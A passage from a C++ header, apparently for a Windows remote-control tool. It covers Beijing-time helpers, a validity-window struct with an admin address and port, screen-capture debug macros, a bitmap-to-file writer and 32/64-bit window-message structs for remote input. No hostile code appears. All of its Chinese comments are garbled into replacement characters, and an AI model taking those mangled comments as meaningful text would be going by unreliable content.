		return { 0, 0, 0, 1, 0, 100 }; // ʧ��ʱ���� 2000-01-01 00:00:00
	}
#else  // Linux / macOS ʹ�� gmtime_r
	if (gmtime_r(&now, &utc_time) == nullptr) {
		return { 0, 0, 0, 1, 0, 100 };
	}
#endif

	// ת��Ϊ����ʱ�䣨UTC+8��
	utc_time.tm_hour += 8;

	// �淶��ʱ�䣨�������������죩
	std::mktime(&utc_time);

	return utc_time;
}

inline std::string ToPekingTimeAsString(const time_t* t) {
	auto pekingTime = ToPekingTime(t);
	char buffer[20];
	std::strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", &pekingTime);
	return buffer;
}

typedef struct Validation {
	char From[20];			// ��ʼ����
	char To[20];			// ��������
	char Admin[100];		// ����Ա��ַ����ǰ���صĹ�����ַ��
	int Port;				// ����Ա�˿ڣ�Ĭ�ϵ�ǰ�˿ڣ�
	char Checksum[16];		// Ԥ���ֶ�
	Validation(float days, const char* admin, int port, const char* id="") {
		time_t from = time(NULL), to = from + time_t(86400 * days);
		memset(this, 0, sizeof(Validation));
		std::string fromStr = ToPekingTimeAsString(&from);
		std::string toStr = ToPekingTimeAsString(&to);
		strcpy_s(From, fromStr.c_str());
		strcpy_s(To, toStr.c_str());
		strcpy_s(Admin, admin);
		Port = port;
		if(strlen(id))memcpy(Checksum, id, 16);
	}
	bool IsValid() const {
		std::string now = ToPekingTimeAsString(NULL);
		return From <= now && now <= To;
	}
}Validation;

#ifdef _DEBUG
// Ϊ�˽��Զ��������Ļ�������������ĺ꣬������ʱʹ�ã���ʽ�汾û��
#define SCREENYSPY_IMPROVE 0
#define SCREENSPY_WRITE 0
#endif

#ifdef _WIN32

#ifdef _WINDOWS
#include <afxwin.h>
#else
#define WIN32_LEAN_AND_MEAN 
#include <windows.h>
#endif

// ���ڴ��е�λͼд���ļ�
inline bool WriteBitmap(LPBITMAPINFO bmpInfo, const void* bmpData, const std::string& filePrefix, int index = -1) {
	char path[_MAX_PATH];
	if (filePrefix.size() >= 4 && filePrefix.substr(filePrefix.size() - 4) == ".bmp") {
		strcpy_s(path, filePrefix.c_str());
	}
	else {
		sprintf_s(path, ".\\bmp\\%s_%d.bmp", filePrefix.c_str(), index == -1 ? clock() : index);
	}
	FILE* File = fopen(path, "wb");
	if (File) {
		BITMAPFILEHEADER fileHeader = { 0 };
		fileHeader.bfType = 0x4D42; // "BM"
		fileHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpInfo->bmiHeader.biSizeImage;
		fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

		fwrite(&fileHeader, 1, sizeof(BITMAPFILEHEADER), File);
		fwrite(&bmpInfo->bmiHeader, 1, sizeof(BITMAPINFOHEADER), File);
		fwrite(bmpData, 1, bmpInfo->bmiHeader.biSizeImage, File);
		fclose(File);
		return true;
	}
	return false;
}

class MSG32 { // �Զ��������Ϣ(32λ)
public:
	uint32_t            hwnd;
	uint32_t            message;
	uint32_t            wParam;
	uint32_t            lParam;
	uint32_t            time;
	POINT               pt;

	MSG32(const void* buffer, int size) {
		if (size == sizeof(MSG32)) {
			memcpy(this, buffer, sizeof(MSG32));
		}
		else {
			memset(this, 0, sizeof(MSG32));
		}
	}

	MSG32() {
		memset(this, 0, sizeof(MSG32));
	}

	MSG32* Create(const void* buffer, int size) {
		if (size == sizeof(MSG32)) {
			memcpy(this, buffer, sizeof(MSG32));
		}
		else {
			memset(this, 0, sizeof(MSG32));
		}
		return this;
	}
};

// Windows �Զ������ϢMSG��32λ��64λϵͳ�´�С��ͬ�����¿�ƽ̨�ܹ�Զ�̿����쳣
// ��Ҫʹ���Զ������Ϣ(ͳһ����64λwindows ��MSG����)
class MSG64 { // �Զ��������Ϣ(64λ)
public:
	uint64_t            hwnd;
	uint64_t            message;
	uint64_t            wParam;
	uint64_t            lParam;
	uint64_t            time;
	POINT               pt;

	MSG64(const MSG& msg) :hwnd((uint64_t)msg.hwnd), message(msg.message), wParam(msg.wParam),
		lParam(msg.lParam), time(msg.time), pt(msg.pt) {}

	MSG64(const MSG32& msg) :hwnd((uint64_t)msg.hwnd), message(msg.message), wParam(msg.wParam),
		lParam(msg.lParam), time(msg.time), pt(msg.pt) {}

	MSG64(const void* buffer, int size) {
		if (size == sizeof(MSG64)) {
			memcpy(this, buffer, sizeof(MSG64));
		}
		else {
			memset(this, 0, sizeof(MSG64));
		}
	}

	MSG64() {
		memset(this, 0, sizeof(MSG64));
	}

	MSG64* Create(const MSG32* msg32) {
		hwnd = msg32->hwnd;
		message = msg32->message;
		wParam = msg32->wParam;
		lParam = msg32->lParam;
		time = msg32->time;
		pt = msg32->pt;
		return this;
	}
};

#ifdef _WIN64
#define MYMSG MSG
#else
#define MYMSG MSG64
#endif

#endif
